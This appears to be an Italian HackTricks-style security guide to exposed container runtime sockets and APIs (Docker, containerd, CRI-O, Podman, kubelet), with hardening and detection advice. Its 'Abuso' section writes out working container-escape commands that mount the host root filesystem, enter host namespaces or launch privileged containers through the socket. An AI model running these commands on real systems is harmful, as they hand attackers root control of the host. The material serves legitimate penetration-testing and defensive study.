# Runtime API E Esposizione del Daemon

{{#include ../../../banners/hacktricks-training.md}}

## Panoramica

Molte compromissioni reali dei container non iniziano affatto con una namespace escape. Iniziano con l'accesso al runtime control plane. Se un workload può comunicare con `dockerd`, `containerd`, CRI-O, Podman, o kubelet tramite un mounted Unix socket o un exposed TCP listener, l'attaccante può essere in grado di richiedere un nuovo container con privilegi maggiori, montare il filesystem dell'host, unirsi alle host namespaces, o recuperare informazioni sensibili del nodo. In questi casi, l'API di runtime è il vero confine di sicurezza, e comprometterla è funzionalmente vicino a compromettere l'host.

Per questo motivo l'esposizione del socket di runtime dovrebbe essere documentata separatamente dalle protezioni del kernel. Un container con seccomp, capabilities, e MAC confinement ordinari può comunque essere a una sola chiamata API dal compromettere l'host se `/var/run/docker.sock` o `/run/containerd/containerd.sock` sono montati al suo interno. L'isolamento del kernel del container corrente può funzionare esattamente come progettato mentre il piano di gestione del runtime rimane completamente esposto.

## Modelli di accesso al daemon

Docker Engine espone tradizionalmente la sua API privilegiata tramite il socket Unix locale `unix:///var/run/docker.sock`. Storicamente è stata anche esposta in remoto tramite listener TCP come `tcp://0.0.0.0:2375` o un listener protetto da TLS su `2376`. Esporre il daemon in remoto senza TLS robusto e autenticazione client equivale a trasformare l'API Docker in un'interfaccia root remota.

containerd, CRI-O, Podman, e kubelet espongono superfici d'impatto simili. I nomi e i workflow differiscono, ma la logica no. Se l'interfaccia permette al chiamante di creare workload, montare host paths, recuperare credenziali, o alterare container in esecuzione, l'interfaccia è un canale di gestione privilegiato e va trattata di conseguenza.

I percorsi locali comuni da verificare sono:
```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/var/run/kubelet.sock
/run/buildkit/buildkitd.sock
/run/firecracker-containerd.sock
```
Stack più vecchi o più specializzati possono anche esporre endpoint come `dockershim.sock`, `frakti.sock` o `rktlet.sock`. Questi sono meno comuni negli ambienti moderni, ma quando vengono incontrati devono essere trattati con la stessa cautela perché rappresentano superfici di controllo del runtime piuttosto che semplici socket applicativi.

## Accesso remoto sicuro

Se un daemon deve essere esposto oltre il socket locale, la connessione dovrebbe essere protetta con TLS e preferibilmente con autenticazione mutua in modo che il daemon verifichi il client e il client verifichi il daemon. La vecchia abitudine di aprire il Docker daemon su HTTP non cifrato per comodità è uno degli errori più pericolosi nell'amministrazione dei container perché la superficie dell'API è sufficientemente potente da poter creare direttamente container privilegiati.

Il modello di configurazione storico di Docker era il seguente:
```bash
DOCKER_OPTS="-H unix:///var/run/docker.sock -H tcp://192.168.56.101:2376"
sudo service docker restart
```
Negli host basati su systemd, la comunicazione dei daemon può apparire anche come `fd://`, il che significa che il processo eredita una socket pre-aperta da systemd invece di eseguire il bind direttamente. La lezione importante non è la sintassi esatta ma la conseguenza sulla sicurezza. Nel momento in cui il daemon ascolta oltre un socket locale con permessi stretti, la sicurezza del trasporto e l'autenticazione del client diventano obbligatorie anziché misure opzionali di hardening.

## Abuso

Se è presente un runtime socket, verifica quale sia, se esiste un client compatibile e se è possibile l'accesso raw HTTP o gRPC:
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
ss -xl | grep -E 'docker|containerd|crio|podman|kubelet' 2>/dev/null
docker -H unix:///var/run/docker.sock version 2>/dev/null
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///var/run/crio/crio.sock ps 2>/dev/null
```
Questi comandi sono utili perché distinguono tra un percorso inesistente, una socket montata ma inaccessibile, e una API privilegiata attiva. Se il client riesce, la domanda successiva è se l'API può lanciare un nuovo container con un host bind mount o host namespace sharing.

### Esempio completo: Docker Socket To Host Root

Se `docker.sock` è raggiungibile, l'escape classico è avviare un nuovo container che monta l'host root filesystem e poi eseguire `chroot` al suo interno:
```bash
docker -H unix:///var/run/docker.sock images
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu:24.04 chroot /host /bin/bash
```
Questo permette l'esecuzione diretta con privilegi root sull'host tramite il Docker daemon. L'impatto non si limita alla sola lettura dei file. Una volta all'interno del nuovo container, l'attaccante può modificare i file dell'host, raccogliere credenziali, impiantare persistenza o avviare ulteriori workload privilegiati.

### Esempio completo: Docker Socket To Host Namespaces

Se l'attaccante preferisce l'accesso ai namespace invece dell'accesso limitato solo al filesystem:
```bash
docker -H unix:///var/run/docker.sock run --rm -it --pid=host --privileged ubuntu:24.04 bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```
Questo percorso raggiunge l'host chiedendo al runtime di creare un nuovo container con esposizione esplicita dell'host-namespace invece di sfruttare quello corrente.

### Esempio completo: containerd socket

Una socket `containerd` montata è di solito altrettanto pericolosa:
```bash
ctr --address /run/containerd/containerd.sock images pull docker.io/library/busybox:latest
ctr --address /run/containerd/containerd.sock run --tty --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
chroot /host /bin/sh
```
L'impatto è, ancora una volta, la compromissione dell'host. Anche se gli strumenti specifici di Docker sono assenti, un'altra runtime API potrebbe comunque offrire lo stesso potere amministrativo.

## Controlli

Lo scopo di questi controlli è rispondere alla domanda se il container possa raggiungere qualsiasi management plane che avrebbe dovuto rimanere al di fuori del perimetro di fiducia.
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
mount | grep -E '/var/run|/run|docker.sock|containerd.sock|crio.sock|podman.sock|kubelet.sock'
ss -lntp 2>/dev/null | grep -E ':2375|:2376'
env | grep -E 'DOCKER_HOST|CONTAINERD_ADDRESS|CRI_CONFIG_FILE'
```
Cosa è interessante qui:

- Un socket runtime montato è solitamente una primitiva amministrativa diretta piuttosto che una semplice divulgazione di informazioni.
- Un listener TCP su `2375` senza TLS dovrebbe essere trattato come una condizione di compromissione remota.
- Variabili d'ambiente come `DOCKER_HOST` spesso rivelano che il workload è stato intenzionalmente progettato per comunicare con il runtime dell'host.

## Impostazioni predefinite del runtime

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Socket Unix locale per impostazione predefinita | `dockerd` ascolta sul socket locale e il daemon è solitamente eseguito con privilegi di root | montaggio di `/var/run/docker.sock`, esposizione di `tcp://...:2375`, TLS debole o mancante su `2376` |
| Podman | CLI senza daemon per impostazione predefinita | Non è richiesto un daemon privilegiato a lunga durata per l'uso locale ordinario; gli API socket possono comunque essere esposti quando `podman system service` è abilitato | esposizione di `podman.sock`, esecuzione estesa del servizio, uso dell'API con privilegi di root |
| containerd | Socket privilegiato locale | API amministrativa esposta tramite il socket locale e solitamente consumata da strumenti di livello superiore | montaggio di `containerd.sock`, accesso esteso con `ctr` o `nerdctl`, esposizione di namespace privilegiati |
| CRI-O | Socket privilegiato locale | L'endpoint CRI è pensato per componenti attendibili locali al nodo | montaggio di `crio.sock`, esposizione dell'endpoint CRI a workload non attendibili |
| Kubernetes kubelet | API di gestione locale al nodo | Il kubelet non dovrebbe essere ampiamente raggiungibile dai Pod; l'accesso può esporre lo stato dei pod, credenziali e funzionalità di esecuzione a seconda di authn/authz | montaggio di socket o certificati del kubelet, autenticazione debole del kubelet, networking dell'host e endpoint kubelet raggiungibile |
